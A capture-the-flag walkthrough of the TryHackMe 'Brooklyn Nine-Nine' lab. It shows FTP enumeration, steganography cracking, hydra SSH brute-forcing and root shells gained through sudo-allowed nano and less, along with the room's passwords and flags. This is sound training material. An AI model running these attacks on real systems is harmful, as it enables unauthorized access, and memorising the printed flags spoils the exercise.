**Room Link:** [Brooklyn Nine-Nine](https://tryhackme.com/room/brooklynninenine)  
**Difficulty:** Easy  
**Categories:** Security, Privilege Escalation, CTF

# Reconnaissance

```
Target IP : 10.10.105.128
```

# Scanning

### All Port Scan with `Rustscan`
```
rustscan -a 10.10.105.128

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/meg4f0rce/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.105.128:21
Open 10.10.105.128:22
Open 10.10.105.128:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 16:55 +06
Initiating Ping Scan at 16:55
Scanning 10.10.105.128 [4 ports]
Completed Ping Scan at 16:55, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:55
Completed Parallel DNS resolution of 1 host. at 16:55, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:55
Scanning 10.10.105.128 [3 ports]
Discovered open port 21/tcp on 10.10.105.128
Discovered open port 22/tcp on 10.10.105.128
Discovered open port 80/tcp on 10.10.105.128
Completed SYN Stealth Scan at 16:55, 0.21s elapsed (3 total ports)
Nmap scan report for 10.10.105.128
Host is up, received reset ttl 60 (0.17s latency).
Scanned at 2025-04-14 16:55:51 +06 for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 60
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
```
![1  ](https://github.com/user-attachments/assets/dfc8e2c3-802e-4fa0-8662-ed703f96ec69)


### Comprehensive Port Scan with `Nmap`
```
nmap -A -T4 -p21,22,80 -oN port_scan 10.10.105.128                                                                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 16:59 +06
Nmap scan report for 10.10.105.128
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   54.10 ms  10.17.0.1
2   ... 4
5   170.64 ms 10.10.105.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds

```
![2](https://github.com/user-attachments/assets/a8a22787-e900-42fa-b54f-c69a179199ba)


# Enumeration

### 21 FTP
#### Anonymous Login Check.
```
nmap -p 21 --script ftp-anon.nse 10.10.105.128

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 17:08 +06
Nmap scan report for 10.10.105.128
Host is up (0.17s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
```
![3](https://github.com/user-attachments/assets/29197ed5-3b63-4b93-a89a-dfbcf6a44add)


#### Login FTP with FTP Client
```
ftp 10.10.105.128

Name (10.10.105.128:meg4f0rce): anonymous
Password None

ftp> ls
229 Entering Extended Passive Mode (|||24242|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.

ftp> get note_to_jake.txt
ftp> exit
```
![4](https://github.com/user-attachments/assets/06ba2b41-cc92-46aa-9995-685b4694039c)

#### **note_to_jake.txt**
```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
![5](https://github.com/user-attachments/assets/12ca4d8b-ba88-445c-9bd7-4b0cbba40944)


#### Create a file all founded Usernames `usernames.txt`
```
jake
holt
amy
```
### 80 HTTP 
-  Visit the site.
- See the source page.
view-source:http://10.10.105.128/ -  Some Hints found here.
	 background-image: url("brooklyn99.jpg")
	<!-- Have you ever heard of steganography? -->

http://10.10.105.128/brooklyn99.jpg - Save this Image
#### Directory Scan with Gobuster
```
gobuster dir -u http://10.10.105.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o dir_scan

There is no Directory found.
```


### Steganography
#### **Check Metadata using `exiftool`**
```
exiftool brooklyn99.jpg 
ExifTool Version Number         : 13.00
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2025:04:14 18:16:19+06:00
File Access Date/Time           : 2025:04:14 18:16:19+06:00
File Inode Change Date/Time     : 2025:04:14 18:16:19+06:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160

```
![6](https://github.com/user-attachments/assets/cb2f1f93-3e84-4a80-87d5-fca1c4904662)


#### **See all Strings in this Picture**
```
strings brooklyn99.jpg 

There is no information.
```
![7](https://github.com/user-attachments/assets/8ea63e21-2400-4b63-8c23-e39c24f966dc)

#### **Check Embedded data with [[Steghide]]**
```
steghide --info brooklyn99.jpg 
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.

[Need Passphrase for Embadded data extraction]
```
![8](https://github.com/user-attachments/assets/b885c6f9-0b78-4ff5-b940-ea8bc8c5adea)


#### **Bruit-force "brooklyn99.jpg" file extract password by [[Stegcracker]] tool** 
```
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out

admin

```
![9](https://github.com/user-attachments/assets/5aab0868-9257-4f02-9d9e-30212ef1a9c8)


#### **Extract this picture embedded data `brooklyn99.jpg` by [[Steghide]] tool**
```
steghide extract -sf brooklyn99.jpg 
Enter passphrase: admin

wrote extracted data to "note.txt".
```
![10](https://github.com/user-attachments/assets/270325aa-9d3e-4a11-aeeb-a4678e167c1e)


#### note.txt
```
cat note.txt                                                                                                               
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
![11](https://github.com/user-attachments/assets/f4d07e8f-9a3a-4fb9-9f2c-7b46eb00897b)


### Try to Bruit-force all users Credentials dumping with `Hydra`
```
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -t 50 10.10.105.128 ssh 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-14 20:14:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 43033197 login tries (l:3/p:14344399), ~860664 tries per task
[DATA] attacking ssh://10.10.105.128:22/

[22][ssh] host: 10.10.105.128   login: jake   password: 987654321

```
![16](https://github.com/user-attachments/assets/3ea52efd-8bf3-46e3-8fd6-fce4fcd394db)


# Exploitation `Method 1` with `Holt's `User

#### Try to `SSH` login with `Holt's` Credentials.
```
ssh holt@10.10.105.128
password: fluffydog12@ninenine

holt@brookly_nine_nine:~$ 
```
![12](https://github.com/user-attachments/assets/470ac869-f778-45c6-8c51-adbde1a1bee8)


#### Find `user.txt` Flag
```
holt@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null
/home/holt/user.txt

holt@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```
![13](https://github.com/user-attachments/assets/219a843c-7b15-42ff-ad22-6b32e2ecdd54)


### Privilege Escalation
- **Sudo Permissions binary list**
```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
![14](https://github.com/user-attachments/assets/b81a396c-297b-4f76-99ed-505d6b70293f)

- **Execute the `Nano` command with `Sudo`**
```
holt@brookly_nine_nine:~$ sudo /bin/nano
Use "fg" to return to nano.

	Press ctrl+R - Read File
	Press ctrl+X - Execute commands
	Execute this Command " reset; bash 1>&0 2>&0 "
```
![15](https://github.com/user-attachments/assets/1ad91262-a8b0-468b-b7f3-bcf44bda0736)

- **Execute the root Command**
```
Command to execute: reset; bash 1>&0 2>&0

root@brookly_nine_nine:~# id                                                          
uid=0(root) gid=0(root) groups=0(root)

root@brookly_nine_nine:~# whoami
root
```

- **Find Root Flag**
```
root@brookly_nine_nine:~# find / -type f -name root.txt 2>/dev/null
/root/root.txt

root@brookly_nine_nine:~# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

```


# Exploitation `Method 2` with `jake's `User

#### Jake's SSH Credentials
```
login: jake 
password: 987654321
```

#### Login SSH
```
ssh jake@10.10.105.128 
jake@10.10.105.128's password: 987654321

Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 

```
![17](https://github.com/user-attachments/assets/7c9881f2-0d50-4372-bb07-b8269e93d47f)


#### Find `user.txt` flag
```
jake@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null
/home/holt/user.txt
jake@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```
![18](https://github.com/user-attachments/assets/a51af5b1-88c2-4920-9985-fb335b920239)


### Privilege Escalation
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
![19](https://github.com/user-attachments/assets/f535741c-0fdc-4f03-92bb-668b07d64f07)


#### Execute `less` Command
```
jake@brookly_nine_nine:~$ sudo less /etc/profile
	!/bin/bash -i

root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
```
![19 1](https://github.com/user-attachments/assets/93f530f7-ab2e-461b-9fa3-b9f8489076ed)

![21](https://github.com/user-attachments/assets/38b76a64-d46c-4d21-9220-09be81286877)


#### Find `root.txt` flag
```
root@brookly_nine_nine:~# find / -type f -name root.txt 2>/dev/null
/root/root.txt

root@brookly_nine_nine:~# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
![20](https://github.com/user-attachments/assets/ec0280eb-7e9f-45ea-8f8e-fc35153d1ecb)
